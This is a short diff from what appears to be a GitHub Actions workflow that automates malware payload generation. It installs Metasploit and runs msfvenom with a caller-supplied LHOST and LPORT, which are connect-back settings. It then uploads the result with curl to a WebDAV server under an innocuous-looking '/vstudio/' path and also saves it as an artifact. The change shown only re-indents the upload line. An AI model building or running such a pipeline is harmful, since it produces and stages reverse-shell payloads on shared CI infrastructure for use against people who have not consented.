@@ -73,7 +73,7 @@ jobs:
             bash -c "apt-get update && \
                      apt-get install -y metasploit-framework && \
                      msfvenom $PLATFORM $FORMAT_FLAG -p $PAYLOAD LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -o '$OUTPUT_FILE'"
-        curl -u ${{ secrets.WEBDAV_USER }}:${{ secrets.WEBDAV_PASS }} -T "${{ env.FILENAME }}.${{ env.EXT }}" "${{ secrets.WEBDAV_ADDR }}/vstudio/${{ env.FILENAME }}.${{ env.EXT }}"
+          curl -u ${{ secrets.WEBDAV_USER }}:${{ secrets.WEBDAV_PASS }} -T "${{ env.FILENAME }}.${{ env.EXT }}" "${{ secrets.WEBDAV_ADDR }}/vstudio/${{ env.FILENAME }}.${{ env.EXT }}"
 
       - name: Upload Payload
         uses: actions/upload-artifact@v4
